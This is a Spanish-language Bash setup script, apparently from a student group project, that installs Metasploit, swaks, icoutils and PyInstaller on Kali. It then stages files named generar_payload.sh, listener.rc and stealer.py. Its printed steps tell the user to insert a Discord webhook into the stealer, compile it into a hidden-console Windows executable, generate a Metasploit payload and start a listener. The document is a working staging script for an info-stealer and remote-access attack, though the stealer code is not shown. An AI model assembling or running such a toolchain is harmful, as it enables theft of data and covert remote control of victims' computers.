#!/bin/bash

echo "========================================"
echo "  GRUPO 4 - Setup completo"
echo "========================================"
echo ""
echo "Actualizando repositorios..."
sudo apt-get update -qq

echo "Instalando dependencias del sistema..."
sudo DEBIAN_FRONTEND=noninteractive apt-get install -y \
    metasploit-framework \
    swaks \
    icoutils \
    zip \
    wget \
    curl \
    python3 \
    python3-pip

echo ""
echo "Instalando librerías de Python..."
pip3 install --quiet pillow requests pyinstaller

echo ""
echo "Creando carpeta del proyecto..."
mkdir -p /home/kali/proyecto-grupo4/capturas

echo ""
echo "Copiando scripts al directorio del proyecto..."
cp generar_payload.sh /home/kali/proyecto-grupo4/
cp listener.rc /home/kali/proyecto-grupo4/
cp stealer.py /home/kali/proyecto-grupo4/
chmod +x /home/kali/proyecto-grupo4/generar_payload.sh

echo ""
echo "========================================"
echo "  Setup completado"
echo "========================================"
echo ""
echo "Pasos para comenzar:"
echo ""
echo "  1. Editar el webhook de Discord en stealer.py:"
echo "     nano /home/kali/proyecto-grupo4/stealer.py"
echo ""
echo "  2. Compilar stealer.py a .exe para Windows:"
echo "     cd /home/kali/proyecto-grupo4"
echo "     pyinstaller --onefile --noconsole stealer.py"
echo "     El .exe queda en dist/stealer.exe"
echo ""
echo "  3. Generar el payload de Metasploit:"
echo "     bash /home/kali/proyecto-grupo4/generar_payload.sh"
echo ""
echo "  4. Iniciar el listener:"
echo "     msfconsole -r /home/kali/proyecto-grupo4/listener.rc"
echo ""
